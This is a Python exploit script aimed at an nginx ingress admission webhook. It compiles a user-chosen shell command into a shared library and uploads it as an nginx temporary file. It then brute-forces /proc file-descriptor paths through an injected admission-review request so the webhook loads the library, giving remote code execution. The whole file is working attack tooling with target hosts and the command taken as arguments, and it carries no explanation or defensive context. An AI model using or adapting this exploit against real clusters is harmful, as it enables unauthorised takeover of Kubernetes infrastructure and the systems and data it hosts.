import socket
import ssl
import sys
import subprocess
from urllib.parse import urlparse
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import logging

def create_so_payload(cmd="id"):
    
    code = open("./lib/template.c", 'r').read()
    payload = code.replace("<PAYLOAD>", cmd)
    with open('./shell.c', 'w') as f:
        f.write(payload)
        f.close()
    
    try:
        res = subprocess.run(["gcc", "-fPIC", "-c", "shell.c", "-o", "./shell.o"])
        return res.returncode > -1
    except Exception as e:
        logger.error(f"GCC compilation error: {e}")
        exit(-1)

    try:
        res = subprocess.run(["gcc", "-shared", "-o", "shell.so", "-lcrypto", "shell.o"])
        return res.returncode > -1
    except Exception as e:
        logger.error(f"GCC compilation error: {e}")
        exit(-1)

def read_so_payload():
    with open('./shell.so', 'rb') as f:
        shared_object = f.read()
    f.close()
    return shared_object

def create_nginx_temp_file(url):
    
    payload_so = read_so_payload()
    # padding   with nul bytes
    padding = 8192 - len(payload_so) + 10
    if padding > 0:
        logger.info(f"Payload smaller than 8KB, padding with {padding} null bytes.")
        payload_so = payload_so + (padding * b'\x00')
    
    cl_len = len(payload_so) + 10
    parsed = urlparse(url)

    host = parsed.hostname
    port = parsed.port
    path = parsed.path or '/'
    
    try:
        tcp_socket = socket.create_connection((host, port))
    except Exception as e:
        logger.error(f"Error: {e} Connecting to {url}")
        sys.exit(-1)

    if parsed.scheme == 'https':
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        wrapped_socket = context.wrap_socket(tcp_socket, server_hostname=parsed.netloc)
        sock = wrapped_socket
    else:
        sock = tcp_socket
    
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-length: {cl_len}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )

    request = headers.encode("iso-8859-1") + payload_so
    sock.sendall(request)
    resp = b""
    while True:
        recv = sock.recv(4096)
        if not recv:
            break
        resp += recv
    # print(resp)
    return resp

def attempt_dlopen(url, data, pid, fd):
    
    headers = {
        "Content-Type": "application/json"
    }
    path = f"/proc/{pid}/fd/{fd}"
    payload = data.replace("<PATH>", path)
    # print(payload)
    try:
        # logger.info(f"Req: {path}")
        resp = requests.post(url=url, data=payload, headers=headers, verify=False)    
        logger.info(f"Attempt: {path} - {resp.status_code}")
    except Exception as e:
        logger.error(f"Error: {e} for {path}")
    
def brute_admission_webhook(url, data, workers=5):

    with ThreadPoolExecutor(max_workers=workers) as executor:
        for pid in range(30, 40):
            for fd in range(10,30):
                executor.submit(attempt_dlopen, url, data, pid, fd)

        # pid=31
        # fd=11
        # executor.submit(attempt_dlopen, url, data, pid, fd)

def main():

    logger = logging.getLogger(__name__)
    logging.basicConfig(level=logging.INFO)

    if len(sys.argv) < 3:
        logger.warning("Usage: python3 exp.py <nginx-host> <admission-webhook-host> <shell_command>")
        sys.exit(-1)
    else:
        nginx_host = sys.argv[1]
        admission_host = sys.argv[2]
        cmd = sys.argv[3]

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    ret = create_so_payload(cmd)
    if ret:
        temp_file = threading.Thread(target=create_nginx_temp_file, args=(nginx_host,))
        temp_file.start()
        
        data = open('./injection/mirror-annotations-review.json', 'r').read()
        brute_admission_webhook(admission_host, data)

logger = logging.getLogger(__name__)

if __name__ == "__main__":
    main()
